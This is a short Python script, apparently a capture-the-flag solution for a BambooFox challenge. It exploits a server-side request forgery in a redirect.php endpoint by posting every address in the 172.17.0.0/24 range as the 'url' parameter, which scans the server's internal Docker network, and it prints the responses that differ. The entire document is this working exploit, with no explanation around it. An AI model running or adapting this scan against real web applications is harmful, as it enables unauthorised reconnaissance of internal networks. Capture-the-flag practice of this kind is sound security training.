#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests

for i in range(256):
    r = requests.post("http://bamboofox.cs.nctu.edu.tw:53323/redirect.php", data={"url":"172.17.0.%d" % i})
    if r.status_code != 200:
        print i,r.status_code
    if "failed" not in r.content:
        print i, r.content
